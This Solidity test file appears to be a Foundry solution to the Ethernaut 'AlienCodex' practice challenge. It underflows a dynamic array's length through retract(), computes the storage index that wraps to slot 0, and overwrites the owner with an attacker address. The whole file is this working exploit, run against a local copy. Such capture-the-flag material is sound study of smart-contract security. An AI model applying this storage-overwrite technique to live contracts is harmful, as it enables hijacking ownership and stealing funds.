// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../ethernaut/AlienCodex.sol";


contract TestAlienCodex is Test {
    AlienCodex alienCodex;
    address deployer = address(0x51);
    address attacker = address(0x52);
    address alienCodexAddress = address(0x53);

    function setUp() external {
        string memory data = vm.readFile("./ethernaut/AlienCodex.bin");
        bytes memory _bytecode = vm.parseBytes(data);
        vm.etch(alienCodexAddress, _bytecode);
        alienCodex = AlienCodex(alienCodexAddress);
        vm.prank(address(0));
        alienCodex.transferOwnership(deployer);
    }

    function testExploit() external {
        assertEq(alienCodex.owner(), deployer);
        alienCodex.make_contact();
        assertEq(alienCodex.contact(), true);
        alienCodex.retract();
        console.logBytes32(vm.load(alienCodexAddress, bytes32(uint(1))));
        bytes32 arrayStartPosition = keccak256(abi.encodePacked(uint256(1)));
        unchecked {
            uint position = type(uint).max + 1 - uint(arrayStartPosition);
            alienCodex.revise(position, bytes32(uint(uint160(attacker))));
        }
        assertEq(alienCodex.owner(), attacker);
    }
}
